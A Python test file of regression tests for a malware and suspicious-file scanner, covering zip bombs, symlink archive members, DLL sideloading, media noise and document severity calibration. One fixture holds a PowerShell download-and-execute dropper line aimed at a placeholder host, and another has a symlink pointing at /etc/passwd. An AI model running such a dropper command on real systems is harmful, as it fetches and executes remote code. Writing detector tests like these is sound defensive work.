"""Regression tests for issues found in the post-implementation review."""
import os
import sys
import unittest
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.base import CorpusTest  # noqa: E402
from tests.gen import craft_pe  # noqa: E402
from pecheck.scan import scan_targets, scan_file  # noqa: E402


class TestUtf16Scripts(CorpusTest):
    def test_utf16le_ps1_dropper_review(self):
        line = "$d = New-Object Net.WebClient; IEX $d.DownloadString('http://x/x.ps1')"
        with open(self.path("u16.ps1"), "wb") as f:
            f.write(b"\xff\xfe" + line.encode("utf-16le"))
        r = scan_file(self.path("u16.ps1"))
        self.assertEqual(r.verdict, "REVIEW")
        self.assertTrue(any("download+execute" in f.detail for f in r.findings))


class TestModProxyDowngrade(CorpusTest):
    def test_reshade_dxgi_not_review(self):
        gd = os.path.join(self.dir, "modgame")
        os.makedirs(gd, exist_ok=True)
        craft_pe(os.path.join(gd, "game.exe"), imports=("CreateFileA",))
        p = craft_pe(os.path.join(gd, "dxgi.dll"), imports=("CreateFileA",), dll_chars=0x2102)
        with open(p, "ab") as f:
            f.write(b"ReShade crosire" + b"\x00" * 16)
        with open(os.path.join(gd, "ReShade.ini"), "w") as f:
            f.write("[GENERAL]")
        res = scan_targets([gd], use_sigs=False)
        dx = next(r for r in res.reports if r.basename == "dxgi.dll")
        sl = [f for f in dx.findings if f.category == "SIDELOAD?"]
        self.assertTrue(all(f.severity == "note" for f in sl), [f.detail for f in sl])
        self.assertNotEqual(dx.verdict, "REVIEW")

    def test_plain_dxgi_without_mod_context_still_review(self):
        gd = os.path.join(self.dir, "plainproxy")
        os.makedirs(gd, exist_ok=True)
        craft_pe(os.path.join(gd, "app2.exe"), imports=("CreateFileA",))
        craft_pe(os.path.join(gd, "dxgi.dll"), imports=("CreateFileA",), dll_chars=0x2102)
        res = scan_targets([gd], use_sigs=False)
        dx = next(r for r in res.reports if r.basename == "dxgi.dll")
        self.assertEqual(dx.verdict, "REVIEW")


class TestBigZip(CorpusTest):
    def test_zip_beyond_raw_cap_members_listed(self):
        import io
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as z:
            z.writestr("big.bin", b"\x00" * (65 << 20))
            z.writestr("marker.exe", b"MZ" + b"\x00" * 100)
        with open(self.path("big.zip"), "wb") as f:
            f.write(buf.getvalue())
        r = scan_file(self.path("big.zip"))
        self.assertFalse(any("zip unreadable" in f.detail for f in r.findings),
                         [f.detail for f in r.findings])
        self.assertTrue(any("marker.exe" in f.detail for f in r.findings))


class TestZipMemberFlags(CorpusTest):
    def test_bomb_ratio_noted(self):
        p = self.path("bomb.zip")
        with zipfile.ZipFile(p, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("bomb.bin", b"\x00" * (50 << 20))
        r = scan_file(p)
        self.assertTrue(any("compression ratio" in f.detail for f in r.findings),
                        [f.detail for f in r.findings])

    def test_symlink_member_noted(self):
        p = self.path("sym.zip")
        zi = zipfile.ZipInfo("link.bin")
        zi.create_system = 3
        zi.external_attr = (0o120777 << 16)
        with zipfile.ZipFile(p, "w") as z:
            z.writestr(zi, "/etc/passwd")
        r = scan_file(p)
        self.assertTrue(any("symlink member" in f.detail for f in r.findings))


class TestMediaNoise(CorpusTest):
    def test_jpg_no_entropy_note(self):
        with open(self.path("photo.jpg"), "wb") as f:
            f.write(b"\xff\xd8\xff\xe0" + os.urandom(200_000) + b"\xff\xd9")
        r = scan_file(self.path("photo.jpg"))
        self.assertEqual(r.kind, "MEDIA")
        self.assertFalse(any("entropy" in f.detail for f in r.findings))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_png_kind_media(self):
        with open(self.path("img.png"), "wb") as f:
            f.write(b"\x89PNG\r\n\x1a\n" + os.urandom(1000))
        self.assertEqual(scan_file(self.path("img.png")).kind, "MEDIA")


class TestCollectEdges(CorpusTest):
    def test_nfo_is_side_file_not_target(self):
        res = scan_targets([self.path("CoolGame-CODEX")], use_sigs=False)
        names = {os.path.basename(r.path) for r in res.reports}
        self.assertNotIn("release.nfo", names)
        self.assertTrue(any("release.nfo" in p for p in res.side_files))

    def test_colon_filename_scanned_on_posix(self):
        with open(self.path("we:ird.bin"), "wb") as f:
            f.write(os.urandom(64))
        res = scan_targets([self.path("we:ird.bin")], use_sigs=False)
        self.assertEqual(len(res.reports), 1)

    def test_huge_file_truncated_flag(self):
        from pecheck.peparse import load, RAW_CAP
        p = self.path("huge2.bin")
        with open(p, "wb") as f:
            f.write(b"z" * (RAW_CAP + 4096))
        t = load(p)
        self.assertTrue(t.truncated)
        self.assertEqual(len(t.raw), RAW_CAP)


class TestSeverityCalibration(CorpusTest):
    def test_plain_rtf_object_not_critical(self):
        with open(self.path("plain.rtf"), "wb") as f:
            f.write(b"{\\rtf1{\\object{\\*\\objdata 0105}}}")
        r = scan_file(self.path("plain.rtf"))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_ole_createobject_only_not_critical(self):
        with open(self.path("stock.doc"), "wb") as f:
            f.write(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 8 +
                    b"AutoOpen" + b"\x00" * 32 + b"CreateObject" + b"\x00" * 32)
        r = scan_file(self.path("stock.doc"))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_pdf_aa_js_form_not_critical(self):
        with open(self.path("form.pdf"), "wb") as f:
            f.write(b"%PDF-1.6\n1 0 obj<</AA 5 0 R/JS 5 0 R>>endobj\n%%EOF\n")
        r = scan_file(self.path("form.pdf"))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_js_bundle_b64_not_critical(self):
        with open(self.path("bundle.js"), "wb") as f:
            f.write(b"const icon = \"data:image/png;base64," + b"QUJD" * 1500 + b"\";")
        r = scan_file(self.path("bundle.js"))
        crit = [f for f in r.findings if f.severity == "CRITICAL"]
        self.assertFalse([f for f in crit if "mammoth" in f.detail])


if __name__ == "__main__":
    unittest.main()
